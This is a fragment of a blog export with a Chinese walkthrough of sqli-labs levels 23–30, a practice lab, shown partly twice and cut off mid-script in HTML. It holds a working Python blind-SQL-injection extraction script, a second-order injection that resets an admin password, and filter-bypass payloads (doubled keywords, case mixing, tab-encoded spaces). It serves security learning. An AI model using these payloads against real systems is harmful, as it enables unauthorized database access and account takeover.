txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n![3](/img/2018-08-17/3.png)\n##### 第二十四关\n这道题目考的是二次注入，可以理解为第一滴构造可以注入的条件，第二次才实施注入\n从源代码上看login.php、login_create.php都被做了过滤\n```\n//login.php\n$username = mysql_real_escape_string($_POST[\"login_user\"]);\n$password = mysql_real_escape_string($_POST[\"login_password\"]);\n\n//login_create.php\n$username=  mysql_escape_string($_POST['username']) ;\n$pass= mysql_escape_string($_POST['password']);\n$re_pass= mysql_escape_string($_POST['re_password']);\n```\nmysql_real_escape_string的作用-->[传送门](http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp)\nmysql_escape_string的作用-->[传送门](http://www.gimoo.net/t/1410/542e28a1e826e.html)\n只有在pass_change.php的username没有做过滤\n```\n$username= $_SESSION[\"username\"];\n$curr_pass= mysql_real_escape_string($_POST['current_password']);\n$pass= mysql_real_escape_string($_POST['password']);\n$re_pass= mysql_real_escape_string($_POST['re_password']);\n```\n假设我们要攻击的用户名为admin，二次注入的方法原理为构造特殊的用户名`admin'#`，在修改`admin'#`的用户密码的时候会由于mysql更新语句\n```\n$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n```\n变为\n```\nUPDATE users SET PASSWORD='pass' where username='admin'#' and password='pass' \";\n```\n这样就可以达到修改admin的密码的目的\n第一步，构建特殊用户名，密码随意\n![4](/img/2018-08-17/4.png)\n登陆后修改密码，当前密码不用填，因为已经注释掉了\n![5](/img/2018-08-17/5.png)\n这样就可以修改admin的密码了\n```\nmysql> select * from users;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy     |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious    |\n|  7 | batman   | mob!le     |\n|  8 | admin    | 123        | \t//admin的默认密码是admin\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 12 | dhakkan  | dumbo      |\n| 14 | admin4   | admin4     |\n| 17 | admin'#  | 123        |\n+----+----------+------------+\n14 rows in set (0.00 sec)\n```\n##### 第二十五关\n过滤`and`和`or`\n首先测试`id=1'`报错说明存在单引号注入，测试`id=1' and '1'='1`返回正常但不是id为1的页面，从下方的提示也可以看到and被过滤掉了\n![6](/img/2018-08-17/6.png)\n测试`id=1' anandd '1'='1`返回正常说明and只被过滤了一次\n![7](/img/2018-08-17/7.png)\n只要把and或or双写就可以绕过了\n还有一种方法是用逻辑运算符代替，用`&&`代替`and`,用`||`代替`or`\n##### 第二十五A关\n这一关考的是过滤了and和or的盲注，同样过滤了and和or，可以用&&和||代替和双写绕过\n```\nid=1 anandd if(length(database())>8,sleep(5),sleep(10)) #\n```\n实测发现可以不用盲注直接注入\n```\nid=-1 union select 1,database(),3\n```\n##### 第二十六关\n这关过滤了空格和注释\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/or/i',\"\", $id);\t\t//strip out OR (non case sensitive)\n$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n$id= preg_replace('/[#]/',\"\", $id);\t\t//Strip out #\n$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t//Strip out slashes\nreturn $id;\n}\n```\n替换空格的方法有\n```\n%09 --TAB键（水平）\n%0a --新建一行\n%0c --新的一页\n%0d --return\n%0b --TAB（垂直）\n%a0 --空格\n```\n最后一个会报错，在linux下可以，跟apache解析有关，测试payload为\n```\nid=-1'%09anandd%09'1'='1\n```\n<b style=\"font-size: 6\"></style>然而</b>\n测试union语句竟然失败了，经过多次反复测试发现上述替换都会被过滤，<b>`id=1'anandd'1'='1`</b>不加空格可以注入成功，网上找到一个盲注的方法，但还是有点缺陷\n```         \nid=1'anandd(ascii(substr(database(),1,1))>=97)anandd'1'='1\n```\n有待补充\n##### 第二十六A关 \n这一关和上一关一样，只不过sql语句多了括号\n```\nid=1')anandd(ascii(substr(database(),1,1))>=97)anandd('1'='1\n```\n##### 第二十七关\n过滤了union和select，下面是过滤代码\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t//strip out /*\n$id= preg_replace('/[--]/',\"\", $id);\t//Strip out --.\n$id= preg_replace('/[#]/',\"\", $id);\t//Strip out #.\n$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/select/m',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/union/s',\"\", $id);\t    //Strip out union\n$id= preg_replace('/select/s',\"\", $id);\t    //Strip out select\n$id= preg_replace('/UNION/s',\"\", $id);\t    //Strip out UNION\n$id= preg_replace('/SELECT/s',\"\", $id);\t    //Strip out SELECT\n$id= preg_replace('/Union/s',\"\", $id);\t    //Strip out Union\n$id= preg_replace('/Select/s',\"\", $id);\t    //Strip out select\nreturn $id;\n}\n```\n对比二十六关过滤空格的代码少了\n```\n$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t//Strip out slashes\n```\nunion可以双写绕过也可以大小写绕过，select要三写才可以绕过，或者大小写绕过,%09可以替换空格，猜测二十六关提到的替换方法应该也可以，注释可以用`and'1'='1`闭合\n```\nid=0' uniounionn%09selecselselectectt%091,database(),3%09and '1'='1\nid=0'%09UnIoN%09sElEcT%091,database(),3%09and%09'1'='1\n```\n![8](/img/2018-08-17/8.png)\n##### 第二十七A关\n和二十七关一样，单引号边双引号，用二十七关的方法即可绕过\n```\nid=0\"%09UnIoN%09sElEcT%091,database(),3%09and%09\"1\"=\"1\n```\n##### 第二十八关\n这一关过滤了`union select`，所以要吧这个双写，把过滤代码的注释去掉要再写一次select\n```\nid=1')%09uniunion%09selselectectoN%09SeLeCt%091,database(),3%09and%09('1'='1\n```\n##### 第二十A关\n源代码把二十八关前面的都注释了，保留了最后一个\n```\nfunction blacklist($id)\n{\n//$id= preg_replace('/[\\/\\*]/',\"\", $id);\t//strip out /*\n//$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --.\n//$id= preg_replace('/[#]/',\"\", $id);\t\t//Strip out #.\n//$id= preg_replace('/[ +]/',\"\", $id);\t    \t//Strip out spaces.\n//$id= preg_replace('/select/m',\"\", $id);\t   //Strip out spaces.\n//$id= preg_replace('/[ +]/',\"\", $id);\t    \t//Strip out spaces.\n$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out spaces.\nreturn $id;\n}\n```\n直接双写`union select`\n```\nid=1') uniounion selectn select 1,database(),3 and ('1'='1 \n```\n##### 第二十九关\n<b style=\"font-size: 30px\">emmm......</b>\n![9](/img/2018-08-17/9.png)\n\"This site protected by world's best Firewall\",really？。感觉一点过滤都没有。。。\n##### 第三十关\n感觉和第二十九关一样\n```\nid=0\" union select 1,database(),3 and \"1\"=\"1\n```\n<div style=\"text-align: center\">\n<b style=\"font-size: 30px;\">卒</b>\n</div>","source":"_posts/2018-08-17-sqli-labs3.md","raw":"---\ntitle: sqli-labs的学习记录三（23-30）\nindex_img: /img/2018-07-20/index.jpg\ndate: 2018-08-17 21:51:53\ntags: \n- 注入\n- web\n- 盲注\n---\n七夕什么的，tan90°\n<!--more-->\n\n##### 第二十三关\n测试\n`id=1' and '1'='1`时返回正常，测试`id=-1' order by 1 #`就报错了，查看源代码可以看到我们递交的参数被过滤了--和#\n![1](/img/2018-08-17/1.png)\n```\n$id=$_GET['id'];\n$reg = \"/#/\";\n$reg1 = \"/--/\";\n$replace = \"\";\n$id = preg_replace($reg, $replace, $id);\n$id = preg_replace($reg1, $replace, $id);\n```\n所以不能用注释的方法只能闭合查询语句，我们可以套用第八关的代码进行盲注查询\n```\nid=1' and ascii(substr(database(),1,1)) >= '97\n```\n![2](/img/2018-08-17/2.png)\npython脚本代码\n```python\nimport requests\ntxt1 = \"http://localhost/sqli-labs/Less-23/?id=1' and ascii(substr(database(),\"\ntxt2 = \",1)) >= '\"\ntxt3 = \",1)) = '\"\npayload1 = 1 \npayload2 = 97\ntxt4 = 'Your Login name'\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9):\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[554:569]\n\tif(reqtext == txt4):\n\t\tnum1 = 1\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[554:569]\n\tif(reqtext == txt4):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[554:569]\n\tif(reqtext == txt4):\n\t\tnum3 = 1\n\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 74) or (num == 87)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num2 == 0 and num3 == 1):\n\t\tnum =48\n\t\tnum += 5\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tnum -= 5\n\t\t\tfor j in range(num,num+5):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n```\n![3](/img/2018-08-17/3.png)\n##### 第二十四关\n这道题目考的是二次注入，可以理解为第一滴构造可以注入的条件，第二次才实施注入\n从源代码上看login.php、login_create.php都被做了过滤\n```\n//login.php\n$username = mysql_real_escape_string($_POST[\"login_user\"]);\n$password = mysql_real_escape_string($_POST[\"login_password\"]);\n\n//login_create.php\n$username=  mysql_escape_string($_POST['username']) ;\n$pass= mysql_escape_string($_POST['password']);\n$re_pass= mysql_escape_string($_POST['re_password']);\n```\nmysql_real_escape_string的作用-->[传送门](http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp)\nmysql_escape_string的作用-->[传送门](http://www.gimoo.net/t/1410/542e28a1e826e.html)\n只有在pass_change.php的username没有做过滤\n```\n$username= $_SESSION[\"username\"];\n$curr_pass= mysql_real_escape_string($_POST['current_password']);\n$pass= mysql_real_escape_string($_POST['password']);\n$re_pass= mysql_real_escape_string($_POST['re_password']);\n```\n假设我们要攻击的用户名为admin，二次注入的方法原理为构造特殊的用户名`admin'#`，在修改`admin'#`的用户密码的时候会由于mysql更新语句\n```\n$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n```\n变为\n```\nUPDATE users SET PASSWORD='pass' where username='admin'#' and password='pass' \";\n```\n这样就可以达到修改admin的密码的目的\n第一步，构建特殊用户名，密码随意\n![4](/img/2018-08-17/4.png)\n登陆后修改密码，当前密码不用填，因为已经注释掉了\n![5](/img/2018-08-17/5.png)\n这样就可以修改admin的密码了\n```\nmysql> select * from users;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy     |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious    |\n|  7 | batman   | mob!le     |\n|  8 | admin    | 123        | \t//admin的默认密码是admin\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 12 | dhakkan  | dumbo      |\n| 14 | admin4   | admin4     |\n| 17 | admin'#  | 123        |\n+----+----------+------------+\n14 rows in set (0.00 sec)\n```\n##### 第二十五关\n过滤`and`和`or`\n首先测试`id=1'`报错说明存在单引号注入，测试`id=1' and '1'='1`返回正常但不是id为1的页面，从下方的提示也可以看到and被过滤掉了\n![6](/img/2018-08-17/6.png)\n测试`id=1' anandd '1'='1`返回正常说明and只被过滤了一次\n![7](/img/2018-08-17/7.png)\n只要把and或or双写就可以绕过了\n还有一种方法是用逻辑运算符代替，用`&&`代替`and`,用`||`代替`or`\n##### 第二十五A关\n这一关考的是过滤了and和or的盲注，同样过滤了and和or，可以用&&和||代替和双写绕过\n```\nid=1 anandd if(length(database())>8,sleep(5),sleep(10)) #\n```\n实测发现可以不用盲注直接注入\n```\nid=-1 union select 1,database(),3\n```\n##### 第二十六关\n这关过滤了空格和注释\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/or/i',\"\", $id);\t\t//strip out OR (non case sensitive)\n$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n$id= preg_replace('/[#]/',\"\", $id);\t\t//Strip out #\n$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t//Strip out slashes\nreturn $id;\n}\n```\n替换空格的方法有\n```\n%09 --TAB键（水平）\n%0a --新建一行\n%0c --新的一页\n%0d --return\n%0b --TAB（垂直）\n%a0 --空格\n```\n最后一个会报错，在linux下可以，跟apache解析有关，测试payload为\n```\nid=-1'%09anandd%09'1'='1\n```\n<b style=\"font-size: 6\"></style>然而</b>\n测试union语句竟然失败了，经过多次反复测试发现上述替换都会被过滤，<b>`id=1'anandd'1'='1`</b>不加空格可以注入成功，网上找到一个盲注的方法，但还是有点缺陷\n```         \nid=1'anandd(ascii(substr(database(),1,1))>=97)anandd'1'='1\n```\n有待补充\n##### 第二十六A关 \n这一关和上一关一样，只不过sql语句多了括号\n```\nid=1')anandd(ascii(substr(database(),1,1))>=97)anandd('1'='1\n```\n##### 第二十七关\n过滤了union和select，下面是过滤代码\n```\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\t//strip out /*\n$id= preg_replace('/[--]/',\"\", $id);\t//Strip out --.\n$id= preg_replace('/[#]/',\"\", $id);\t//Strip out #.\n$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/select/m',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n$id= preg_replace('/union/s',\"\", $id);\t    //Strip out union\n$id= preg_replace('/select/s',\"\", $id);\t    //Strip out select\n$id= preg_replace('/UNION/s',\"\", $id);\t    //Strip out UNION\n$id= preg_replace('/SELECT/s',\"\", $id);\t    //Strip out SELECT\n$id= preg_replace('/Union/s',\"\", $id);\t    //Strip out Union\n$id= preg_replace('/Select/s',\"\", $id);\t    //Strip out select\nreturn $id;\n}\n```\n对比二十六关过滤空格的代码少了\n```\n$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t//Strip out slashes\n```\nunion可以双写绕过也可以大小写绕过，select要三写才可以绕过，或者大小写绕过,%09可以替换空格，猜测二十六关提到的替换方法应该也可以，注释可以用`and'1'='1`闭合\n```\nid=0' uniounionn%09selecselselectectt%091,database(),3%09and '1'='1\nid=0'%09UnIoN%09sElEcT%091,database(),3%09and%09'1'='1\n```\n![8](/img/2018-08-17/8.png)\n##### 第二十七A关\n和二十七关一样，单引号边双引号，用二十七关的方法即可绕过\n```\nid=0\"%09UnIoN%09sElEcT%091,database(),3%09and%09\"1\"=\"1\n```\n##### 第二十八关\n这一关过滤了`union select`，所以要吧这个双写，把过滤代码的注释去掉要再写一次select\n```\nid=1')%09uniunion%09selselectectoN%09SeLeCt%091,database(),3%09and%09('1'='1\n```\n##### 第二十A关\n源代码把二十八关前面的都注释了，保留了最后一个\n```\nfunction blacklist($id)\n{\n//$id= preg_replace('/[\\/\\*]/',\"\", $id);\t//strip out /*\n//$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --.\n//$id= preg_replace('/[#]/',\"\", $id);\t\t//Strip out #.\n//$id= preg_replace('/[ +]/',\"\", $id);\t    \t//Strip out spaces.\n//$id= preg_replace('/select/m',\"\", $id);\t   //Strip out spaces.\n//$id= preg_replace('/[ +]/',\"\", $id);\t    \t//Strip out spaces.\n$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out spaces.\nreturn $id;\n}\n```\n直接双写`union select`\n```\nid=1') uniounion selectn select 1,database(),3 and ('1'='1 \n```\n##### 第二十九关\n<b style=\"font-size: 30px\">emmm......</b>\n![9](/img/2018-08-17/9.png)\n\"This site protected by world's best Firewall\",really？。感觉一点过滤都没有。。。\n##### 第三十关\n感觉和第二十九关一样\n```\nid=0\" union select 1,database(),3 and \"1\"=\"1\n```\n<div style=\"text-align: center\">\n<b style=\"font-size: 30px;\">卒</b>\n</div>","slug":"sqli-labs3","published":1,"mouth":"08","updated":"2020-09-18T03:23:27.228Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhox5000cez8kn41pznf9","content":"<p>七夕什么的，tan90°<br><a id=\"more\"></a></p>\n<h5 id=\"第二十三关\"><a href=\"#第二十三关\" class=\"headerlink\" title=\"第二十三关\"></a>第二十三关</h5><p>测试<br><code>id=1&#39; and &#39;1&#39;=&#39;1</code>时返回正常，测试<code>id=-1&#39; order by 1 #</code>就报错了，查看源代码可以看到我们递交的参数被过滤了–和#<br><img src=\"/img/2018-08-17/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">$</span><span class=\"bash\">id=<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>];</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">reg = <span class=\"hljs-string\">\"/#/\"</span>;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">reg1 = <span class=\"hljs-string\">\"/--/\"</span>;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">replace = <span class=\"hljs-string\">\"\"</span>;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">id = preg_replace(<span class=\"hljs-variable\">$reg</span>, <span class=\"hljs-variable\">$replace</span>, <span class=\"hljs-variable\">$id</span>);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">id = preg_replace(<span class=\"hljs-variable\">$reg1</span>, <span class=\"hljs-variable\">$replace</span>, <span class=\"hljs-variable\">$id</span>);</span></code></pre></p>\n<p>所以不能用注释的方法只能闭合查询语句，我们可以套用第八关的代码进行盲注查询<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>' and ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)) &gt;= '<span class=\"hljs-number\">97</span></code></pre></p>\n<p><img src=\"/img/2018-08-17/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>python脚本代码<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests\ntxt1 = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-23/?id=1' and ascii(substr(database(),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1)) &gt;= '\"</span>\ntxt3 = <span class=\"hljs-string\">\",1)) = '\"</span>\npayload1 = <span class=\"hljs-number\">1</span> \npayload2 = <span class=\"hljs-number\">97</span>\ntxt4 = <span class=\"hljs-string\">'Your Login name'</span>\nnum11 = <span class=\"hljs-number\">97</span>\nnum12 = <span class=\"hljs-number\">65</span>\nnum13 = <span class=\"hljs-number\">48</span>\ncode = <span class=\"hljs-string\">''</span>\nnum1 = <span class=\"hljs-number\">0</span>\nnum2 = <span class=\"hljs-number\">0</span>\nnum3 = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">9</span>):\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\tnum1 = <span class=\"hljs-number\">1</span>\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\tnum2 = <span class=\"hljs-number\">1</span>\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\tnum3 = <span class=\"hljs-number\">1</span>\n\n\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">97</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext != txt4):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4) <span class=\"hljs-keyword\">and</span> ((num == <span class=\"hljs-number\">106</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">119</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = 